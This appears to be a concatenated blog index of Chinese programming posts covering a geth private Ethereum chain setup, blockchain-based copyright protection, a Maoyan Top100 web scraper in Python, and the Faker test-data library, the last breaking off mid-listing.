很多时候，在开发中我们需要使用私有链进行测试。\n本文主要讲述如何在Ubuntu系统中使用以太坊虚拟环境搭建私有链。\nGeth（go-ethereum客户端） 首先，我们需要安装 geth 。具体安装参考官方指南\n打开终端，分别输入以下命令：\nsudo apt-get installsoftware-properties-common sudo add-apt-repository -yppa:ethereum/ethereum sudo add-apt-repository -yppa:ethereum/ethereum-dev sudo apt-get update sudo apt-get install ethereum 安装过程中如果出错，就要去看官方安装指南，可能缺少某些组件，这样就需要我们先安装所需要的组件。\n安装完成后，输入 geth ,如果现实出命令行各种参数提示信息，则说明安装成功。\n搭建私有链 以太坊支持自定义区块。我们需要定义自己的创世区块作为首节点。\n创世区块 创世区块的信息写在一个json格式的配置文件中。首先将下面的内容保存成一个json文件，例如 genesis.json 。\n文件内容如下：\n{ \u0026#34;config\u0026#34;: { \u0026#34;chainId\u0026#34;: 10, \u0026#34;homesteadBlock\u0026#34;: 0, \u0026#34;eip155Block\u0026#34;: 0, \u0026#34;eip158Block\u0026#34;: 0 }, \u0026#34;alloc\u0026#34; : {}, \u0026#34;coinbase\u0026#34; : \u0026#34;0x0000000000000000000000000000000000000000\u0026#34;, \u0026#34;difficulty\u0026#34; : \u0026#34;0x20000\u0026#34;, \u0026#34;extraData\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;gasLimit\u0026#34; : \u0026#34;0x2fefd8\u0026#34;, \u0026#34;nonce\u0026#34; : \u0026#34;0x0000000000000042\u0026#34;, \u0026#34;mixhash\u0026#34; : \u0026#34;0x0000000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;parentHash\u0026#34; : \u0026#34;0x0000000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;timestamp\u0026#34; : \u0026#34;0x00\u0026#34; } 写入创世区块 我们先建一个名叫 privatechain 的文件夹，用来存储所有私链的所需要的信息。然后在把 genesis.json 文件放入此文件夹。我们还需要在 privatechain 文件夹中创建一个名叫 data0 的文件夹来存放区块链的数据，这个文件夹就相当于一个根节点。当我们基于genesis.json生成根节点后，其他人就可以来连接此根节点，从而能进行交易)。\n接下来进入 privatechain 目录下，执行初始化命令：\ncd privatechain geth --datadir data0 init genesis.json 上面的命令的主体是 geth init，表示初始化区块链，命令可以带有选项和参数，其中 \u0026ndash;datadir 选项后面跟一个目录名，这里为 data0，表示指定数据存放目录为 data0， genesis.json 是 init 命令的参数。\n运行上面的命令，会读取 genesis.json 文件，根据其中的内容，将创世区块写入到区块链中。如果看到信息中含有Successfully wrote genesis state字样，说明初始化成功。\n这时，我们查看一下 privatechain 的目录结构：\n其中 geth/chaindata 中存放的是区块数据，keystore中存放的是账户数据。\n启动私有节点 初始化完成后，就有了一条自己的私有链，之后就可以启动自己的私有链节点并做一些操作，在终端中输入以下命令即可启动节点：\ngeth --datadir data0 --networkid 1108 console 上面命令的主体是 geth console，表示启动节点并进入交互式控制台 \u0026ndash;datadir 选项指定使用 data0 作为数据目录， \u0026ndash;networkid 选项后面跟一个数字，这里是1108，表示指定这个私有链的网络id为1108。网络id在连接到其他节点的时候会用到，以太坊公网的网络id是1，为了不与公有链网络冲突，运行私有链节点的时候要指定自己的网络id(上面命令可能会运行失败，直接重启，再进入到privatechain目录中)。\n运行上面的命令后，就启动了区块链节点并进入了Javascript Console：\n这是一个交互式的Javascript执行环境，在这里面可以执行Javascript代码，其中\u0026gt;是命令提示符。在这个环境里也内置了一些用来操作以太坊的Javascript对象，可以直接使用这些对象。这些对象主要包括：\neth：包含一些跟操作区块链相关的方法 net：包含以下查看p2p网络状态的方法 admin：包含一些与管理节点相关的方法 miner：包含启动\u0026amp;停止挖矿的一些方法 personal：主要包含一些管理账户的方法 txpool：包含一些查看交易内存池的方法 web3：包含了以上对象，还包含一些单位换算的方法 使用Javascript Console 进入以太坊Javascript Console后，就可以使用里面的内置对象做一些操作，这些内置对象提供的功能很丰富，比如查看区块和交易、创建账户、挖矿、发送交易、部署智能合约等。接下来介绍几个常用功能，下面的操作中，前面带\u0026gt;的表示在Javascript Console中执行的命令。\n创建账户 前面只是搭建了私有链，并没有自己的账户，可以在js console中输入eth.accounts来验证：\n\u0026gt; eth.accounts\r[] 此时没有账户，接下来使用personal对象来创建一个账户：\n\u0026gt; personal.newAccount()\r\u0026gt; Passphrase:\r\u0026gt; Repeat passphrase: Passphrase其实就是密码的意思，输入两次密码后，就创建了一个账户。再次执行命令，这时候再去看账户，就有两个了:\n\u0026gt; eth.accounts 账户默认会保存在数据目录的 keystore 文件夹中。查看目录结构，发现 data0/keystore 中多了两个文件，这两个文件就对应刚才创建的两个账户，这是json格式的文本文件，可以打开查看，里面存的是私钥经过密码加密后的信息。\n查看账户余额 eth对象提供了查看账户余额的方法：\n\u0026gt; eth.getBalance(eth.accounts[0])\r0\r\u0026gt; eth.getBalance(eth.accounts[1])\r0 目前两个账户的以太币余额都是0，要使账户有余额，可以从其他账户转账过来，或者通过挖矿来获得以太币奖励。\n启动，停止挖矿 通过miner.start()来启动挖矿：\n\u0026gt; miner.start(10) 其中start的参数表示挖矿使用的线程数。第一次启动挖矿会先生成挖矿所需的DAG文件，这个过程有点慢，等进度达到100%后，就会开始挖矿，此时屏幕会被挖矿信息刷屏。\n图中percentage表示进度，进度达到100%开始挖矿。\n出现小锤子即为挖到了。\n如果想停止挖矿，并且进度已经达到100%之后，可以在输入：\n\u0026gt; miner.stop()： 注意：输入的字符会被挖矿刷屏信息冲掉，没有关系，只要输入完整的miner.stop()之后回车，即可停止挖矿。\n挖到一个区块会奖励5个以太币，挖矿所得的奖励会进入矿工的账户，这个账户叫做 coinbase。\n默认情况下 coinbase 是本地账户中的第一个账户，现在的coinbase是账户0 要想使挖矿奖励进入其他账户，通过miner.setEtherbase()将其他账户设置成coinbase即可 挖到区块以后，账户0里面应该就有余额了，用getBalance()查看，其返回值的单位是 wei，wei 是以太币的最小单位，1个以太币=10的18次方个 wei。要查看有多少个以太币，可以用web3.fromWei()将返回值换算成以太币 \u0026gt; eth.coinbase\r\u0026gt; miner.setEtherbase(eth.accounts[1])\r\u0026gt; web3.fromWei(eth.getBalance(eth.accounts[0]),\u0026#39;ether\u0026#39;) 发送交易 截止目前，账户1的余额还是0：\n\u0026gt; eth.getBalance(eth.accounts[1])\r0 可以通过发送一笔交易，从账户0转移10个以太币到账户1：\n这里需要注意的是，账户每隔一段时间就会被锁住，要发送交易，必须先解锁账户，由于我们要从账户0发送交易，所以要解锁账户0，输入创建账户时设置的密码，就可以成功解锁账户。 \u0026gt; personal.unlockAccount(eth.accounts[0])\rUnlock account 0x4a3b0216e1644c1bbabda527a6da7fc5d178b58f\rPassphrase: true 然后我们发送交易：\n\u0026gt; amount = web3.toWei(10,\u0026#39;ether\u0026#39;)\r\u0026#34;10000000000000000000\u0026#34;\r\u0026gt; eth.sendTransaction({from:eth.accounts[0],to:eth.accounts[1],value:amount}) 我们去查看账户1中的余额：\n\u0026gt; eth.getBalance(eth.accounts[1])\r0 发现还没转过去，此时交易已经提交到区块链，但还未被处理，这可以通过查看txpool来验证：\n\u0026gt; txpool.status\r{\rpending: 1,\rqueued: 0\r} 其中有一条pending的交易，pending表示已提交但还未被处理的交易。\n要使交易被处理，必须要挖矿。这里我们启动挖矿，然后等待挖到一个区块之后就停止挖矿：\n\u0026gt; miner.start(1);admin.sleepBlocks(1);miner.stop(); 当miner.stop()返回true后，txpool中pending的交易数量应该为0了，说明交易已经被处理了，而账户1应该收到币了：\n\u0026gt; web3.fromWei(eth.getBalance(eth.accounts[1]),\u0026#39;ether\u0026#39;)\r10 查看交易和区块 eth对象封装了查看交易和区块信息的方法。\n查看当前区块总数：\n\u0026gt; eth.blockNumber 通过区块号查看区块：\n\u0026gt; eth.getBlock(66) 至此，私链搭建工作就基本完成了。\n参考 LBC-Team\n柠檬宵宵-区块链学习（三）\n","date":"2019-04-20T16:15:47+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/","title":"使用以太坊虚拟环境搭建私有链"},{"content":"​\t2008年底，一位化名“中本聪”（Satoshi nakamoto）的学者发表了区块链技术的奠基性论文《Bitcoin: A Peer-to-Peer Electronic Cash System》。狭义来讲，区块链是一种按照时间顺序将数据区块以链条的方式组合成特定数据结构，并以密码学方式保证的不可篡改和不可伪造的去中心化共享总账，能够安全存储简单的，有先后关系的、能在系统内验证的数据。广义的区块链技术是利用加密式区块链结构来验证与存储数据、利用分布式节点共识算法来生成和更新数据、利用自动化脚本代码（智能合约）来编程和操作数据的一种全新的去中心化基础架构与分布式计算范式。而区块链版权保护就是基于区块链底层的密码学技术，用去中心化的网络结构建立信任关系，实现数字版权的有效保护。伴随着“比特币”热度的下降以及人们的不断探索和尝试。\n​\t区块链底层技术的其他应用方向逐渐被人们发现，其中一项就是“区块链+版权保护”，实现数字版权信息上链。十年间，在“区块链+版权保护”领域，已经有许多成功案例，也有越来越多的国内外相关创业团队开始探索这一技术领域。其中国外的企业团队的产品有：Monegraph，Colu，Binded，SingularDTV，Mine Labs等。这些大部分是用于音乐影视作品，绘画摄影作品，文学作品的数字版权保护。Monegraph是由纽约大学教授Kevin McCoy 和技术专家Anil Dash合作开发的利用区块链技术保护艺术家数字资产的项目；用户通过推特账号登录到Monegraph 选择数字资产的网址链接，进入该作品的网站，支付一笔小额网费，即可将信息记录到区块链上。Binded 在2017年将业务重点从技术转移到具有法律效力的记录创建，获得了首笔55万美元的融资以后，Binded又得到了来自日本报社Asahi Shimbun、游戏公司GungHo创始人Taizo Son的子公司Mistletoe、M\u0026amp;Y Growth Partners、Tokyo Founders基金会、Vectr Ventures风投以及Social Starts的总共95万美元的融资，Binded通过在区块链上记录永久有效的版权来方便内容创建者保护自己的知识产权。Mine Labs是美国纽约的一家创业公司，开发了一个基于区块链的元数据协议，这个名为 Mediachain 的系统利用 IPFS（ Interplanetary File System）文件系统，实现数字作品版权保护，目前主要是面向数字图片的版权保护应用；目前，Mediachain已经为超过 200 万张原创图片创建元数据记录，纽约现代艺术博物馆、美国数字公共图书馆和欧洲数字图书馆都是Mediachain 的用户。\n​\t国内也有很多团队进行相关技术的开发和研究，并且上线了相关的项目，得到社会和政府的认可和支持。比如亿书，纸贵版权，原本等企业。亿书链文化科技有限公司，是一家专注于使用区块链解决版权存证、版权交易、内容分发、知识创富的技术驱动型文化科技公司。西安纸贵互联网科技有限公司成立于2016年，致力于通过区块链重塑版权价值，打造可信任的版权数据库以及数字化版权资产交易平台，并提供侵权监测、法律维权、IP孵化等相关服务，2018年3月，纸贵科技获得了数千万元的A轮融资。而原本早在2015年就开始了将区块链应用于版权领域的尝试，并和国内外前沿的区块链研究者和社区保持密切的联系，16年成为上海区块链产业发展联盟的首批成员是国内首个“区块链+版权保护”平台。\n​\t2016年区块链首次被列入国务院印发《“十三五”国家信息化规划》。2018年5月，工信部发布的《2018年中国区块链产业白皮书》中写道：我国《“十三五”国家信息化规划》中把区块链作为一项重点前沿技术，明确提出需加强区块链等新技术的创新、试验和应用，以实现抢占新一代信息技术主导权。目前，我国区块链技术持续创新，区块链产业初步形成，开始在供应链金融、征信、产品溯源、版权交易、数字身份、电子证据等领域快速应用，有望推动我国经济体系实现技术变革，组织变革和效率变革，为构建现代化经济体系作出重要贡献。2018年 6 月，工信部印发《工业互联网发展行动计划（2018-2020 年）》，鼓励推进区块链等新兴前沿技术在各领域的应用研究。并且在工信部2018年数字安全十大热点评选活动中，区块链安全产业入选数字安全技术产业方面的十大热点。就在今年3月28日的中国版权服务年会DCI体系论坛上，版权中心联合国内多家头部互联网平台和核心机构发布了DCI标准联盟链体系。在区块链技术的帮助下，DCI体系得到进一步升级。版权信息登记进一步权威化，而版权作品的后续消费，也变得有据可查。\n​\t“区块链+版权保护”已经成为区块链应用的一个重要分支。但是目前还有不少问题和挑战。由于区块链系统具有分布式高冗余复杂度、时序数据且不可篡改和伪造、去中心化信用、自动执行的智能合约、安全和隐私保护等特点，也就有效的解决了传统版权存证、确权、交易、维权等工作时出现的一系列问题。从“区块链”这一名词出现的十年间，越来越多的人开始进入这一领域，这个研究方向也吸引了大量的社会和官方组织的人才资金注入。证明了其存在的价值性以及未来广阔的应用发展空间。尽管“区块链+产权保护”这一技术领域相当年轻，但是显然，这已经成为未来数字版权保护一个重要的发展方向。\n","date":"2019-04-01T20:59:22+08:00","permalink":"https://lizonglingo.github.io/p/%E6%B5%85%E8%B0%88%E5%8C%BA%E5%9D%97%E9%93%BE-%E7%89%88%E6%9D%83%E4%BF%9D%E6%8A%A4/","title":"浅谈“区块链+版权保护”"},{"content":" 这是教材上的一个实例，今天学的总结一下。\n首先感谢一下同老师送滴书哼\n顺便推一下这本书：《Python3网路爬虫开发实战》（崔庆才）\n先给代码 Pycharm + py3.7 调过\n不很长50行左右，爬一下猫眼top100的一些信息\nfrom builtins import len, open, str, range import json import time from requests.exceptions import RequestException import requests import re def get_one_page(url): try: # 伪装请求头改为Chrome headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) \u0026#39; \u0026#39;Chome/65.0.3325.162 Safari/537.36\u0026#39; } response = requests.get(url, headers=headers) if response.status_code == 200: return response.text return None except RequestException: return None def parse_one_page(html): pattern = re.compile( \u0026#39;\u0026lt;dd\u0026gt;.*?board-index.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt;.*?data-src=\u0026#34;(.*?)\u0026#34;.*?name.*?a.*?\u0026gt;(.*?)\u0026lt;/a\u0026gt;.*?star.*?\u0026gt;(.*?)\u0026lt;/p\u0026gt;.*?releasetime.*?\u0026gt;(.*?)\u0026lt;/p\u0026gt;\u0026#39; \u0026#39;.*?integer.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt;.*?fraction.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt;.*?\u0026lt;/dd\u0026gt;\u0026#39;, re.S ) items = re.findall(pattern, html) for item in items: yield { \u0026#39;index\u0026#39;: item[0], \u0026#39;image\u0026#39;: item[1], \u0026#39;title\u0026#39;: item[2], \u0026#39;actor\u0026#39;: item[3].strip()[3:], \u0026#39;time\u0026#39;: item[4].strip()[5:], \u0026#39;score\u0026#39;: item[5] + item[6] } def write_to_file(content): with open(\u0026#39;result_maoyan.txt\u0026#39;, \u0026#39;a\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: f.write(json.dumps(content, ensure_ascii=False) + \u0026#39;\\n\u0026#39;) def main(offset): url = \u0026#39;https://maoyan.com/board/4?offset=\u0026#39; + str(offset) html = get_one_page(url) for item in parse_one_page(html): print (item) write_to_file(item) if __name__ == \u0026#39;__main__\u0026#39;: for i in range(10): main(offset = i*10) time.sleep(1) 详解 首先是抓取单页请求信息，一些内容直接码在代码里了 def get_one_page(url): try: # 伪装请求头改为Chrome， 配置头信息 # 猫眼有反爬，如果被识别为爬虫会给你返回个大嘴巴子，这里伪装Chrome浏览器 headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) \u0026#39; \u0026#39;Chome/65.0.3325.162 Safari/537.36\u0026#39; } # 使用requests方法 response = requests.get(url, headers=headers) # 通过状态码判断是否出现问题 if response.status_code == 200: # 如果没有问题就返回抓取的页面信息 return response.text return None except RequestException:\t# 我想良好的代码风格应该少不了try-expect return None 第二部分主要是通过正则表达式提取有价值信息，主要就是正则表达式的使用 有部分涉及到 yield 的使用，贴一篇前辈的文章，关于 yield 讲的比较清楚\ndef parse_one_page(html): pattern = re.compile( \u0026#39;\u0026lt;dd\u0026gt;.*?board-index.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt;.*?data-src=\u0026#34;(.*?)\u0026#34;.*?name.*?a.*?\u0026gt;(.*?)\u0026lt;/a\u0026gt;.*?star.*?\u0026gt;(.*?)\u0026lt;/p\u0026gt;.*?releasetime.*?\u0026gt;(.*?)\u0026lt;/p\u0026gt;\u0026#39; \u0026#39;.*?integer.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt;.*?fraction.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt;.*?\u0026lt;/dd\u0026gt;\u0026#39;, re.S ) # re.compile()是把字符串转化成正则表达式常用的方法，之后使用findall方法 items = re.findall(pattern, html) for item in items: # yield 是我第一次用，就类似于特殊的return，返回设定的字典数据类型 yield { \u0026#39;index\u0026#39;: item[0], \u0026#39;image\u0026#39;: item[1], \u0026#39;title\u0026#39;: item[2], \u0026#39;actor\u0026#39;: item[3].strip()[3:], \u0026#39;time\u0026#39;: item[4].strip()[5:], \u0026#39;score\u0026#39;: item[5] + item[6] } 关于正则表达式，我也是好久才明白，其实匹配的就是 (.*?) 里面的东西。我们看下面的正则表达式：\npattern = re.compile( \u0026#39;\u0026lt;dd\u0026gt;.*?board-index.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt;.*?data-src=\u0026#34;(.*?)\u0026#34;.*?name.*?a.*?\u0026gt;(.*?)\u0026lt;/a\u0026gt;.*?star.*?\u0026gt;(.*?)\u0026lt;/p\u0026gt;.*?releasetime.*?\u0026gt;(.*?)\u0026lt;/p\u0026gt;\u0026#39; \u0026#39;.*?integer.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt;.*?fraction.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt;.*?\u0026lt;/dd\u0026gt;\u0026#39;, re.S ) 现来分析一下网页源码：\n我们主要提取以下内容：\n排名信息 电影图片 电影名称 主演 发布时间 评分 就以排名信息为栗子：\n我们所要获取的，就是 1 这个数字，正则表达式如下：\n\u0026lt;dd\u0026gt;.*?board-index.*?\u0026gt;(.*?)\u0026lt;/i\u0026gt; 这一部分开始于 \u0026lt; dd \u0026gt; 结束于 \u0026lt; /i \u0026gt; 后面的那个 ( .*? ) 就是我们要匹配的内容。\n然后我们写入文件 def write_to_file(content): with open(\u0026#39;result_maoyan.txt\u0026#39;, \u0026#39;a\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: f.write(json.dumps(content, ensure_ascii=False) + \u0026#39;\\n\u0026#39;) 调用函数是这样的 def main(offset): url = \u0026#39;https://maoyan.com/board/4?offset=\u0026#39; + str(offset) html = get_one_page(url) for item in parse_one_page(html): print (item) write_to_file(item) 由于猫眼每页只显示10条信息，我们先看一下URL有什么规律：\n第一页：\n第二页：\n第三页：\n懂了吧，offset就是传入的那个最后的数据，之后调用请求获取当页信息的函数，写入文件的函数，就OK了。\n主函数 if __name__ == \u0026#39;__main__\u0026#39;: for i in range(10): main(offset = i*10) time.sleep(1) 这里用了 time.sleep 方法，如果我们访问时间过快，会被判定为非正常访问就会被封 IP 不能再继续爬取，这里设定间隔 1 s。\n总结 几个关键点：\n请求头处理。\n一般来讲，现在许多网站都有反爬措施，如果检测请求头，发现是来自爬虫，那么多半会拒绝你的访问，所以这里修改了请求头。\n正则表达式。\n这个还是要多练多去看别人是怎么写的。\n请求时间。\n不要过快就好，模仿人类速度。\n要开始学Go了，后面的项目有涉及到区块链，有时间更一篇区块链的吧。还有非自然死亡真的太好看了8也！！！\n","date":"2019-03-20T22:14:27+08:00","permalink":"https://lizonglingo.github.io/p/%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BCtop100/","title":"爬取猫眼Top100"},{"content":" 本文转自前辈的文章\n原文链接：Hjqjk\u0026rsquo;s Blog\n我们在开发中常常需要利用一些假数据来做测试,这种时候就可以使用 Faker 来伪造数据从而用来测试。\nFaker 是一个可以让你生成伪造数据的Python包。当你需要初始化数据库，创建美观的XML文档，不断产生数据来进行压力测试或者想从生产服务器上拉取匿名数据的时候，Faker将是你最棒的选择。\n安装 Faker库已经被提交到 pip，可以通过 pip 工具直接安装。\npip install Faker 使用 官方文档\nfaker 提供了一个工厂函数，用来创建数据：\n\u0026gt;\u0026gt;\u0026gt; from faker import Factory \u0026gt;\u0026gt;\u0026gt; fake1 = Factory.create() 当然，也提供一个Faker类来创建实例：\n\u0026gt;\u0026gt;\u0026gt; from faker import Faker \u0026gt;\u0026gt;\u0026gt; fake2 = Faker() \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; fake2.name() \u0026#39;Audrey Robinson\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake2.address() \u0026#39;4266 Fritz Shore\\nLewischester, AL 24594-7593\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake2.text() \u0026#39;Odio porro unde sint aliquid beatae. Ex officiis porro nostrum laboriosam deleniti nisi. A aut molestiae ratione ipsam perspiciatis facere.\\nDicta incidunt at deleniti recusandae accusamus quisquam.\u0026#39; 每次调用方法 fake.name() 都会产生不同的（随机）结果。这是因为 faker 向 faker.Generator.method_name() 调用了 faker.Generator.format(method_name)。\n本地化 在用 Faker() 创建 faker 实例时，可以为实例指定本地化区域参数，默认为 ‘en_US`，因此生成的姓名、地址等都是美国的。 要生成中文伪造数据，只需：\n\u0026gt;\u0026gt;\u0026gt; fake = Faker(\u0026#34;zh_CN\u0026#34;) 方法介绍 如上面例子，每次调用 fake 实例的 name()方法时，都会产生不同随机姓名。fake 实例还有很多方法可用，这些方法分为以下几类：\naddress 地址 person 人物类：性别、姓名等 barcode 条码类 color 颜色类 company 公司类：公司名、公司email、公司名前缀等 credit_card 银行卡类：卡号、有效期、类型等 currency 货币 date_time 时间日期类：日期、年、月等 file 文件类：文件名、文件类型、文件扩展名等 internet 互联网类 job 工作 lorem 乱数假文 misc 杂项类 phone_number 手机号码类：手机号、运营商号段 python python数据 profile 人物描述信息：姓名、性别、地址、公司等 ssn 社会安全码(身份证号码) user_agent 用户代理 address 地址 \u0026gt;\u0026gt;\u0026gt; fake.country() # 国家 \u0026#39;奥地利\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.city() # 城市 \u0026#39;郑州市\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.city_suffix() # 城市的后缀,中文是：市或县 \u0026#39;市\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.address() # 地址 \u0026#39;河北省巢湖县怀柔南宁路f座 169812\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.street_address() # 街道 \u0026#39;邯郸路W座\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.street_name() # 街道名 \u0026#39;合肥路\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.postcode() # 邮编 \u0026#39;314548\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.latitude() # 维度 Decimal(\u0026#39;68.0228435\u0026#39;) \u0026gt;\u0026gt;\u0026gt; fake.longitude() # 经度 Decimal(\u0026#39;155.964341\u0026#39;) person 人物 \u0026gt;\u0026gt;\u0026gt; fake.name() # 姓名 \u0026#39;单玉珍\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.last_name() # 姓 \u0026#39;潘\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.first_name() # 名 \u0026#39;琴\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.name_male() # 男性姓名 \u0026#39;官平\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.last_name_male() # 男性姓 \u0026#39;安\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.first_name_male() # 男性名 \u0026#39;文\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.name_female() # 女性姓名 \u0026#39;许颖\u0026#39; barcode 条码 \u0026gt;\u0026gt;\u0026gt; fake.ean8() # 8位条码 \u0026#39;12771363\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.ean13() # 13位条码 \u0026#39;9133134950963\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.ean(length=8) # 自定义位数条码,只能选8或者13 \u0026#39;20417161\u0026#39; color 颜色 \u0026gt;\u0026gt; fake.hex_color() # 16进制表示的颜色 \u0026#39;#671f6d\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.rgb_css_color() # css用的rgb色 \u0026#39;rgb(237,74,237)\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.rgb_color() # 表示rgb色的字符串 \u0026#39;208,102,218\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.color_name() # 颜色名字 \u0026#39;Brown\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.safe_hex_color() #安全16进制色 \u0026#39;#ee4400\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.safe_color_name() # 安全颜色名字 \u0026#39;maroon\u0026#39; company 公司 \u0026gt;\u0026gt;\u0026gt; fake.company() # 公司名 \u0026#39;时空盒数字科技有限公司\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.company_suffix() # 公司名后缀 \u0026#39;科技有限公司\u0026#39; credit_card 银行信用卡 \u0026gt;\u0026gt;\u0026gt; fake.credit_card_number(card_type=None) # 卡号 \u0026#39;375325478746231\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.credit_card_provider(card_type=None) # 卡的提供者 \u0026#39;VISA 13 digit\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.credit_card_security_code(card_type=None)# 卡的安全密码 \u0026#39;450\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.credit_card_expire() # 卡的有效期 \u0026#39;04/22\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.credit_card_full(card_type=None) # 完整卡信息 \u0026#39;Maestro\\n秀芳 商\\n502001016117 04/27\\nCVV: 144\\n\u0026#39; currency 货币 \u0026gt;\u0026gt;\u0026gt; fake.currency_code() # 货币代码 \u0026#39;HNL\u0026#39; date_time 时间日期 \u0026gt;\u0026gt;\u0026gt; fake.date_time(tzinfo=None) # 随机日期时间 datetime.datetime(2001, 3, 18, 17, 57, 44) \u0026gt;\u0026gt;\u0026gt; fake.iso8601(tzinfo=None) # 以iso8601标准输出的日期 \u0026#39;1973-11-16T22:58:37\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.date_time_this_month(before_now=True, after_now=False, tzinfo=None) # 本月的某个日期 datetime.datetime(2017, 11, 1, 14, 33, 48) \u0026gt;\u0026gt;\u0026gt; fake.date_time_this_year(before_now=True, after_now=False, tzinfo=None) # 本年的某个日期 datetime.datetime(2017, 3, 2, 13, 55, 31) \u0026gt;\u0026gt;\u0026gt; fake.date_time_this_decade(before_now=True, after_now=False, tzinfo=None) # 本年代内的一个日期 datetime.datetime(2010, 3, 26, 6, 33, 23) \u0026gt;\u0026gt;\u0026gt; fake.date_time_this_century(before_now=True, after_now=False, tzinfo=None) # 本世纪一个日期 datetime.datetime(2015, 7, 21, 19, 27, 53) \u0026gt;\u0026gt;\u0026gt; fake.date_time_between(start_date=\u0026#34;-30y\u0026#34;, end_date=\u0026#34;now\u0026#34;, tzinfo=None) # 两个时间间的一个随机时间 datetime.datetime(2005, 12, 3, 17, 17, 15) \u0026gt;\u0026gt;\u0026gt; fake.timezone() # 时区 \u0026#39;America/Guatemala\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.time(pattern=\u0026#34;%H:%M:%S\u0026#34;) # 时间（可自定义格式） \u0026#39;11:21:52\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.am_pm() # 随机上午下午 \u0026#39;PM\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.month() # 随机月份 \u0026#39;02\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.month_name() # 随机月份名字 \u0026#39;August\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.year() # 随机年 \u0026#39;1974\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.day_of_week() # 随机星期几 \u0026#39;Sunday\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.day_of_month() # 随机月中某一天 \u0026#39;02\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.time_delta() # 随机时间延迟 datetime.timedelta(13371, 27637) \u0026gt;\u0026gt;\u0026gt; fake.date_object() # 随机日期对象 datetime.date(1983, 1, 26) \u0026gt;\u0026gt;\u0026gt; fake.time_object() # 随机时间对象 datetime.time(17, 8, 56) \u0026gt;\u0026gt;\u0026gt; fake.unix_time() # 随机unix时间（时间戳） 1223246848 \u0026gt;\u0026gt;\u0026gt; fake.date(pattern=\u0026#34;%Y-%m-%d\u0026#34;) # 随机日期（可自定义格式） \u0026#39;1984-04-20\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.date_time_ad(tzinfo=None) # 公元后随机日期 datetime.datetime(341, 9, 11, 8, 6, 9) file 文件 \u0026gt;\u0026gt;\u0026gt; fake.file_name(category=\u0026#34;image\u0026#34;, extension=\u0026#34;png\u0026#34;) # 文件名（指定文件类型和后缀名） \u0026#39;增加.png\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.file_name() # 随机生成各类型文件 \u0026#39;提供.pdf\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.file_extension(category=None) # 文件后缀 \u0026#39;txt\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.mime_type(category=None) # mime-type \u0026#39;image/png\u0026#39; internet 互联网 \u0026gt;\u0026gt;\u0026gt; fake.ipv4(network=False) # ipv4地址 \u0026#39;104.225.105.10\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.ipv6(network=False) # ipv6地址 \u0026#39;dea6:ca11:39d0:b49f:fff1:82f1:bf88:698b\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.uri_path(deep=None) # uri路径 \u0026#39;search/categories\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.uri_extension() # uri扩展名 \u0026#39;.htm\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.uri() # uri 